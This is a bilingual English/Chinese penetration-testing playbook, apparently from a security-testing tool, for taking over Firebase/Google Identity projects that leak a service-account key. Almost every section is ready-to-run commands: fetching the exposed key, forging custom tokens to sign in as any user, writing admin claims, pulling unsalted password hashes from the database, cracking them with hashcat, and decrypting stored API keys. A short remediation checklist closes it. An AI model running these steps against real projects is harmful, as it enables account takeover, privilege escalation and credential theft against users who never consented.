# Firebase / Google Identity Takeover Playbook / Firebase 与 Google Identity 接管手册

[English](#english) · [中文](#中文)

---

<a id="english"></a>

## English

> **Applicable targets**: Applications leaking `serviceAccountKey.json`, web `apiKey`, or `firebaseConfig` in frontend bundles or public endpoints.
> Every step below has been verified against live targets. **For authorized security testing only.**

### 0. Triage: check if `serviceAccountKey.json` is exposed

```bash
curl -s -o sak.json -w "%{http_code}\n" https://TARGET/serviceAccountKey.json
python3 -c "import json;d=json.load(open('sak.json'));print(d['project_id'], d['client_email'])"
```

Obtaining a `firebase-adminsdk-*@<project>.iam.gserviceaccount.com` key grants **project-level admin privileges** immediately—no password cracking needed.

### 1. Exchange RS256 JWT for an OAuth2 access token

```python
# Request all three scopes; omitting any one of them causes 401s later
scope = "https://www.googleapis.com/auth/cloud-platform \
https://www.googleapis.com/auth/identitytoolkit \
https://www.googleapis.com/auth/firebase.database"
# Header: {alg: "RS256", kid: private_key_id}
# Claims: {iss: client_email, scope, aud: "https://oauth2.googleapis.com/token", iat, exp}
# Sign with openssl dgst -sha256 -sign private_key.pem | base64url → POST https://oauth2.googleapis.com/token
```

Verify the granted scopes: `GET https://oauth2.googleapis.com/tokeninfo?access_token=...`

### 2. Enumerate users (`accounts:query`)

```bash
curl -X POST "https://identitytoolkit.googleapis.com/v1/projects/$P/accounts:query" \
  -H "Authorization: Bearer $TOK" -H 'content-type: application/json' -d '{"maxResults":200}'
# → recordsCount + userInfo[] (email / emailVerified / customAttributes / disabled)
# Note: passwordHash is always REDACTED by Google on this endpoint
```

### 3. Account takeover via Custom Token (**no password required**)

```bash
# Sign locally using firebase-admin or Python with the service account private key:
admin.auth().createCustomToken(uid)
# Exchange for a live idToken using the frontend's public web apiKey:
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=$WEB_KEY" \
  -d "{\"token\":\"$CUSTOM\",\"returnSecureToken\":true}"
# → idToken is a valid session for that arbitrary UID
```

This is the most direct takeover path: **stronger than password cracking because you never need the user's password**.

### 4. Privilege escalation: write custom claims

```python
admin.auth().setCustomUserClaims(uid, {"admin": True, "role": "admin"})
# Any new idToken minted for this UID will carry these claims (effective immediately if backend/rules check claims)
```

Verified: writing claims succeeds; whether it unlocks additional data depends on whether backend rules inspect `auth.token.admin` / `auth.token.role`.

### 5. Data plane verification (can we actually read data?)

| Target endpoint | Observed result | Explanation |
|---|---|---|
| RTDB REST `?auth=<idToken>` | 401 `Permission denied` | Rules locked down (even owners cannot read their own root) |
| RTDB REST `?access_token=<oauth>` | 401 `Unauthorized request` | Database in locked state |
| Firestore REST | 404 | Firestore not enabled on project |
| Rules API | 200 (empty) | No visible ruleset |

→ **Taking over the identity plane does not automatically mean the data plane is readable.** Always distinguish between *"Identity takeover confirmed"* and *"Data access confirmed"* in the report.

### 5b. If RTDB has a `User/<email>` node, the password path works

Check node readability first **before** deciding whether to crack hashes:

```text
GET /User/<email_with_dots_replaced_by_commas>.json?auth=<idToken>
# Example: user@example.com → /User/user,example,com.json
```

Key gotchas:

1. **Path case and escaping**: The node is `User/` (capital `U`), and Firebase keys replace `.` with `,` in emails. Requesting `/users/<uid>` returns `401`—not because you lack permission, but because the path is wrong.
2. **Include the `email` claim in the custom token**: Call `createCustomToken(uid, {email, email_verified: true})`. Otherwise `auth.token.email` is empty in RTDB security rules and reading the user's own node returns `401`.
3. **Common fields in `User/<email>`**: `role` (`Admin` / `User`), `Password` (**unsalted SHA-256**), `APIKeys` (PBKDF2-encrypted blob).

Once you retrieve `Password` hashes, crack them locally:

```bash
# Built-in plugin tool (recommended — uses bundled top10k wordlist automatically):
vapt_crack hashes:"c775e7…" confirm:true
# Or automatically scan all evidence/artifacts in the current engagement for hashes:
vapt_crack hashes:"auto" confirm:true
# Equivalent raw hashcat command:
hashcat -m 1400 hash.txt 10k-most-common.txt --potfile-disable -o cracked.txt
```

Verify the recovered password with a **real password login** (`provider=password`):

```bash
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=$WEB_KEY" \
  -d '{"email":"...","password":"...","returnSecureToken":true}'
# 200 → real password-authenticated session; User.json?shallow=true then lists all users (if admin)
```

### 5c. Reversing client-side `APIKeys` encryption

When client code derives an AES-GCM key from a public value (such as the user's email) and a hardcoded salt:

```text
key = PBKDF2(email, "<Hardcoded-Application-Salt>", 100000, SHA-256) → AES-GCM-256
blob = base64(iv[12] || ciphertext || tag)
```

Because `email` and the hardcoded salt are known, the encryption key is deterministically derivable and all stored API keys can be decrypted offline using `node:crypto` (`webcrypto.subtle.deriveKey` + `decrypt`).

### 6. Why the password path sometimes fails (and ordering priority)

- Firebase Auth's `passwordHash` is always `REDACTED` via REST unless the app stores a separate hash in RTDB/Firestore.
- Online brute force triggers `TOO_MANY_ATTEMPTS_TRY_LATER` after ~8 attempts.
- **Always follow this order**: **Custom Token takeover → Custom Claims privilege escalation → RTDB node read & offline hash cracking**.

### 7. Reporting checklist

- **Leaked `serviceAccountKey.json` = Critical** (not High): it grants project-wide administrative control.
- **Required evidence**: `accounts:query` `recordsCount` (with redacted sample), HTTP 200 from `signInWithCustomToken`, and before/after diff of custom claims.
- **Remediation**: Revoke and rotate the service account key immediately, restrict `express.static` to `public/` (blocking `*.json`, `.git`, `server.js`), and enable Firebase App Check.

---

<a id="中文"></a>

## 中文

> 适用：前端泄露 `serviceAccountKey.json`、web `apiKey`、`firebaseConfig` 的目标。
> 本文所有步骤都在真实靶标上跑通过；**只用于授权测试**。

### 0. 判断有没有戏

```bash
curl -s -o sak.json -w "%{http_code}\n" https://TARGET/serviceAccountKey.json
python3 -c "import json;d=json.load(open('sak.json'));print(d['project_id'], d['client_email'])"
```

拿到 `firebase-adminsdk-*@<project>.iam.gserviceaccount.com` 就等于**项目级 admin**，不用破密码。

### 1. 换 token（RS256 JWT → OAuth2）

```python
# scopes 三个都要，缺一个后面会 401
scope = "https://www.googleapis.com/auth/cloud-platform \
https://www.googleapis.com/auth/identitytoolkit \
https://www.googleapis.com/auth/firebase.database"
# header {alg:RS256, kid:private_key_id}；claims {iss:client_email, scope, aud:https://oauth2.googleapis.com/token, iat, exp}
# openssl dgst -sha256 -sign private_key.pem | base64url → POST https://oauth2.googleapis.com/token
```

校验 scope 是否真的下发：`GET https://oauth2.googleapis.com/tokeninfo?access_token=...`

### 2. 列用户（即时战果）

```bash
curl -X POST "https://identitytoolkit.googleapis.com/v1/projects/$P/accounts:query" \
  -H "Authorization: Bearer $TOK" -H 'content-type: application/json' -d '{"maxResults":200}'
# → recordsCount + userInfo[]（email / emailVerified / customAttributes / disabled）
# 注意：passwordHash 恒为 REDACTED，Google 不下发
```

### 3. 账号接管：custom token（**不需要密码**）

```bash
# 本地签（firebase-admin / python）
admin.auth().createCustomToken(uid)
# 换取 idToken（用前端泄露的 web apiKey）
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=$WEB_KEY" \
  -d "{\"token\":\"$CUSTOM\",\"returnSecureToken\":true}"
# → idToken 就是该用户的会话（任意 UID）
```

这是「拿到权限」最直接的一条：**比破解密码强，因为不需要知道密码**。

### 4. 提权：写 custom claims

```python
admin.auth().setCustomUserClaims(uid, {"admin": True, "role": "admin"})
# 之后该用户重新取 token 就带这些 claims（服务端/规则若检查 claims 即生效）
```

实测：能写成功；但是否解锁资源取决于规则是否读 claims。

### 5. 数据面（能不能真读到数据）

| 目标 | 实测结果 | 说明 |
|---|---|---|
| RTDB REST `?auth=<idToken>` | 401 `Permission denied` | 规则锁死（连 owner 自己都读不到自己） |
| RTDB REST `?access_token=<oauth>` | 401 `Unauthorized request` | 数据库 locked 状态 |
| Firestore REST | 404 | 未启用 |
| Rules API | 200 但空 | 无可见 ruleset |

→ **身份层完全拿下，数据层可能仍然空**。报告里必须区分「已接管身份」与「已读到数据」。

### 5b. RTDB 里如果有 `User/<email>` 节点，口令线就走得通（实测）

判断顺序（**先读节点，再决定要不要破**）：

```text
GET /User/<email 里的点换成逗号>.json?auth=<idToken>
# 例：user@example.com → /User/user,example,com.json
```

要点：

1. **路径大小写与转义**：是 `User/`（大写 U），key 是 **email 把 `.` 换成 `,`**；直接试 `/users/<uid>` 会 401，不是没有权限，是路径错了。
2. **custom token 要带 email claim**：`createCustomToken(uid, {email, email_verified:true})`，否则规则里 `auth.token.email` 为空，读自己节点也会 401。
3. 节点里常见字段：`role`（`Admin`/`User`）、`Password`（**无盐 SHA-256**）、`APIKeys`（PBKDF2 加密）。

命中 `Password` 后本地破解：

```bash
# 插件内（推荐）：内置 top10k 字典，无需自己准备
vapt_crack hashes:"c775e7…" confirm:true
# 或自动扫描本靶证据里的哈希（按长度自动分组，多类型混排也不会挂）
vapt_crack hashes:"auto" confirm:true
# 直接 hashcat 等价命令
hashcat -m 1400 hash.txt 10k-most-common.txt --potfile-disable -o cracked.txt
```

用破出的口令做**真实登录**（而不是只拿 token）：

```bash
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=$WEB_KEY" \
  -d '{"email":"...","password":"...","returnSecureToken":true}'
# 200 → provider=password 的真实会话；随后 User.json?shallow=true 可列全部用户（admin）
```

### 5c. `APIKeys` 的客户端加密可逆性分析

当客户端代码使用公开字段（如 email）与硬编码盐值派生密钥时：

```text
key = PBKDF2(email, "<Hardcoded-Application-Salt>", 100000, SHA-256)  → AES-GCM-256
blob = base64(iv[12] || ciphertext||tag)
```

email 是公开的 → 密钥可推导 → 全部 key 可利用 `node:crypto` 的 `webcrypto.subtle.deriveKey` + `decrypt` 离线解密。

### 6. 密码这条线为什么**有时**走不通

- Firebase 的 `passwordHash` 永远 `REDACTED`，没有本地哈希可跑 hashcat；
- 应用若把口令存在自己的 DB 里（罕见），才可能有 `sha256/md5` 可破；
- 在线爆破会被 `TOO_MANY_ATTEMPTS_TRY_LATER` 拦住（实测 8 次即触发）。

所以正确次序是：**先试 custom token 接管 → 再试 claims 提权 → 最后才考虑口令线**。

### 7. 报告要点

- 「service account key 泄露」= Critical，不是 High：它等于项目管理员。
- 取证要存：`accounts:query` 的 recordsCount（脱敏样本）、idToken 换取成功的响应码、claims 写入前后对比。
- 修复：删 key + 轮换、`express.static` 收敛到 `public/`、排除 `*.json|.git|server.js`、开 App Check。
